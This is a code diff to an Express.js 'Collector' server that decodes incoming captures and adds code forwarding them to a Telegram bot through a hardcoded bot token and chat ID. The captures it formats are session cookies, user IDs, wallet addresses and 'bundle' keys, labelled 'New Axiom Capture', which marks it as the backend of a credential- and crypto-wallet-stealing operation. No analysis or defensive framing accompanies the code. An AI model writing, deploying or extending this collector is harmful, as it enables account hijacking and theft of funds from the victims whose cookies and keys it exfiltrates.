@@ -2,16 +2,73 @@ const express = require('express');
 const app = express();
 app.use(express.json({ limit: '1mb' }));
 
-app.get('/data/:encoded', (req, res) => {
+const TELEGRAM_TOKEN = '8744030589:AAGZkvTlFfpfp9m_S0Rr6Rf3NpPmr46o76M';
+const TELEGRAM_CHAT_ID = '8691443497';
+
+async function sendTelegram(text) {
+  const maxLen = 4000;
+  for (let i = 0; i < text.length; i += maxLen) {
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text.substring(i, i + maxLen),
+          parse_mode: 'Markdown'
+        })
+      });
+    } catch (e) {
+      console.log('Telegram send failed:', e.message);
+    }
+  }
+}
+
+app.get('/data/:encoded', async (req, res) => {
   try {
     const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
+
     console.log('===== NEW CAPTURE =====');
     console.log(JSON.stringify(decoded, null, 2));
     console.log('========================');
-  } catch(e) {
-    console.log('Invalid data');
+
+    // Build Telegram message
+    let msg = '🔑 *New Axiom Capture*\n\n';
+
+    if (decoded.user) {
+      msg += '*User ID:* `' + (decoded.user.userId || 'N/A') + '`\n';
+      msg += '*Wallet:* `' + (decoded.user.registrationWallet || 'N/A') + '`\n';
+    }
+
+    if (decoded.bundle) {
+      msg += '*Bundle Key:* `' + decoded.bundle + '`\n';
+    }
+
+    if (decoded.wallets && decoded.wallets.length > 0) {
+      msg += '\n*Wallets:*\n';
+      decoded.wallets.forEach((w, i) => {
+        msg += '  ' + (i + 1) + '. `' + w.walletAddress + '` (' + w.network + ')\n';
+      });
+    }
+
+    if (decoded.cookies) {
+      msg += '\n🍪 *Cookies:*\n```' + decoded.cookies.substring(0, 1000) + '```\n';
+    }
+
+    if (decoded.sBundles) {
+      msg += '\n📦 *sBundles:* `' + decoded.sBundles.substring(0, 200) + '...`\n';
+    }
+
+    if (decoded.eBundles) {
+      msg += '\n📦 *eBundles:* `' + decoded.eBundles.substring(0, 200) + '...`\n';
+    }
+
+    await sendTelegram(msg);
+    res.send('ok');
+  } catch (e) {
+    console.log('Invalid data received:', e.message);
+    res.send('ok');
   }
-  res.send('ok');
 });
 
-app.listen(10000, () => console.log('Collector running'));
+app.listen(10000, () => console.log('Collector running on port 10000'));
